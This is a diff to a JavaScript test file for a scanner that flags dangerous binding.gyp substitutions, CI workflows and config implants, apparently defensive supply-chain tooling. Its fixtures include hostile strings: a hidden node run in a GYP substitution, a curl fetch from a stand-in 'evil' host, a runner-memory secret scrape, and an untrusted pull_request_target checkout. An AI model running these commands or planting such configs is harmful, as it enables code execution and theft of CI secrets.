@@ -41,8 +41,12 @@ describe('classify', () => {
 // binding.gyp — "Phantom Gyp"
 // ---------------------------------------------------------------------------
 describe('bindingGypIsDangerous', () => {
-  it('blocks GYP command-substitution <!()', () => {
+  it('blocks Phantom Gyp command-substitution (>/dev/null && echo stub)', () => {
     const gyp = '{ "targets": [ { "sources": [ "<!(node index.js > /dev/null 2>&1 && echo stub.c)" ] } ] }';
+    assert.equal(bindingGypIsDangerous(gyp), true);
+  });
+  it('blocks a substitution that fetches the network', () => {
+    const gyp = "{ 'variables': { 'x': '<!(curl https://evil/p | base64 -d)' } }";
     assert.equal(bindingGypIsDangerous(gyp), true);
   });
   it('blocks an action array that shells out', () => {
@@ -51,6 +55,10 @@ describe('bindingGypIsDangerous', () => {
   });
   it('allows a benign native-addon binding.gyp', () => {
     const gyp = '{ "targets": [ { "target_name": "addon", "sources": [ "addon.cc", "util.cc" ] } ] }';
+    assert.equal(bindingGypIsDangerous(gyp), false);
+  });
+  it('allows a sharp-style config-reading substitution (<!(node -p ...))', () => {
+    const gyp = "{ 'variables': { 'vips_version': '<!(node -p \"require(\\'../lib/libvips\\').minimumLibvipsVersion\")' } }";
     assert.equal(bindingGypIsDangerous(gyp), false);
   });
 });
@@ -66,14 +74,15 @@ describe('workflowIsDangerous', () => {
     const wf = 'on: pull_request_target\njobs:\n  b:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}';
     assert.equal(workflowIsDangerous(wf), true);
   });
-  it('blocks curl | sh in a run step', () => {
-    assert.equal(workflowIsDangerous('jobs:\n  b:\n    steps:\n      - run: curl https://evil/x | sh'), true);
-  });
   it('blocks runner-memory secret scrape', () => {
     assert.equal(workflowIsDangerous('run: cat /proc/$PID/mem | grep \'"isSecret":true\''), true);
   });
   it('allows a normal CI workflow', () => {
     const wf = 'name: CI\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm test';
+    assert.equal(workflowIsDangerous(wf), false);
+  });
+  it('allows a legit installer curl|sh (rustup/bun) — not a scrape signature', () => {
+    const wf = 'name: CI\non: push\njobs:\n  b:\n    steps:\n      - run: curl -sL https://sh.rustup.rs | sh';
     assert.equal(workflowIsDangerous(wf), false);
   });
   it('allows pull_request_target without untrusted checkout (labeler pattern)', () => {
@@ -137,7 +146,7 @@ describe('checkForConfigImplant', () => {
   it('blocks a Write of a malicious binding.gyp', () => {
     const reason = checkForConfigImplant('Write', {
       file_path: '/repo/pkg/binding.gyp',
-      content: '{ "targets": [ { "sources": [ "<!(node index.js)" ] } ] }',
+      content: '{ "targets": [ { "sources": [ "<!(node index.js > /dev/null 2>&1 && echo stub.c)" ] } ] }',
     });
     assert.ok(reason);
     assert.match(reason, /binding\.gyp/);
